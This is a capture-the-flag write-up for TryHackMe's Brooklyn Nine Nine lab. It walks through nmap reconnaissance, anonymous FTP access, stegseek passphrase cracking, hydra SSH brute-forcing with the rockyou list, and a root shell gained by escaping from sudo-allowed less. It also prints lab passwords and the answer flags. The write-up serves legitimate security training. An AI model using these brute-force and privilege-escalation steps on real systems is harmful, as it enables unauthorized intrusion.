# Brooklyn_nine_nine | THM | Vishakhan Pillai | 26/05/2025

```bash
export IP=10.10.123.189
```
## nmap

```
# Nmap 7.95 scan initiated Mon May 26 21:48:38 2025 as: /usr/lib/nmap/nmap --privileged -sC -sV -oN nmap/initial -vv 10.10.123.189
Nmap scan report for 10.10.123.189
Host is up, received reset ttl 60 (0.21s latency).
Scanned at 2025-05-26 21:48:39 IST for 16s
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 60 vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.17.58.216
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
22/tcp open  ssh     syn-ack ttl 60 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDQjh/Ae6uYU+t7FWTpPoux5Pjv9zvlOLEMlU36hmSn4vD2pYTeHDbzv7ww75UaUzPtsC8kM1EPbMQn1BUCvTNkIxQ34zmw5FatZWNR8/De/u/9fXzHh4MFg74S3K3uQzZaY7XBaDgmU6W0KEmLtKQPcueUomeYkqpL78o5+NjrGO3HwqAH2ED1Zadm5YFEvA0STasLrs7i+qn1G9o4ZHhWi8SJXlIJ6f6O1ea/VqyRJZG1KgbxQFU+zYlIddXpub93zdyMEpwaSIP2P7UTwYR26WI2cqF5r4PQfjAMGkG1mMsOi6v7xCrq/5RlF9ZVJ9nwq349ngG/KTkHtcOJnvXz
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBItJ0sW5hVmiYQ8U3mXta5DX2zOeGJ6WTop8FCSbN1UIeV/9jhAQIiVENAW41IfiBYNj8Bm+WcSDKLaE8PipqPI=
|   256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP2hV8Nm+RfR/f2KZ0Ub/OcSrqfY1g4qwsz16zhXIpqk
80/tcp open  http    syn-ack ttl 60 Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon May 26 21:48:55 2025 -- 1 IP address (1 host up) scanned in 16.93 seconds

```

## FTP Anonymous Login Enumeration
- FTP anonymous login found
- found note_to_jake.txt 

``` bash
cat note_to_jake.txt 

From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine


``` 

## HTTP Site Enumeration
- Examined source code to find this particular comment
```html
<!-- Have you ever heard of steganography? -->
```
- downloading the image in the website to analyse it further

## Analysing the downloaded image

- cracked the image password using stegseek

```bash
stegseek --crack brooklyn99.jpg /usr/share/wordlists/rockyou.txt steg_output.txt
```
```
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: "admin"
[i] Original filename: "note.txt".
[i] Extracting to "steg_output.txt".
```

- Found a password for user name holt
```
fluffydog12@ninenine
```

## Initial Access
- Possible password for SSH service found earlier for the user holt
```bash
ssh holt@10.10.123.189
```
user.txt found at /home/holt


## Privilege Escalation

### Enumerating the User Holt
-
- searching for SUID binaries - no results
- searching for commands that can be run with sudo

```bash
sudo -l
```
```
Matching Defaults entries for holt on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User holt may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /bin/nano
```

### Enumerating the User Jake
- Possible jake user found
- cracking jake's ssh password using hydra
```bash
hydra -l jake -P /usr/share/wordlists/rockyou.txt ssh://10.10.123.189
```
```
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-05-26 22:30:51
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.123.189:22/
[22][ssh] host: 10.10.123.189   login: jake   password: 987654321
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 1 final worker threads did not complete until end.
[ERROR] 1 target did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-05-26 22:30:58

```
- searching for commands that can be run with sudo

```bash
sudo -l
```
```
Matching Defaults entries for jake on brookly_nine_nine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jake may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /usr/bin/less
```

exploiting /use/bin/less (using GTFObins)
```bash
sudo less /etc/profile
!/bin/sh
```

<b>root access achieved</b>


## Flags

-user.txt
```
ee11cbb19052e40b07aac0ca060c23ee
```

- root.txt
```
63a9f0ea7bb98050796b649e85481845
```
